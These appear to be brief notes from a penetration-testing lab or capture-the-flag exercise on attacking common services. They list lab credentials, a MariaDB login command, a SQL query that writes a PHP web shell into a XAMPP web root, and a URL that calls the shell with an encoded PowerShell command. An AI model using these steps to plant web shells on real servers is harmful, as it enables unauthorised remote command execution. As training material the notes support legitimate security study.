# Attacking common services

## Easy

SMTP fiona@inlanefreight.htb 987654321

FTP fiona 987654321



```
mariadb -h «IP» -u fiona -p987654321
```

```
SELECT "<?php system($_GET['cmd']); ?>" into outfile "C:\\xampp\\htdocs\\backdoor.php"
```

```
https://«IP»/backdoor.php/?cmd=powershell -e 
```
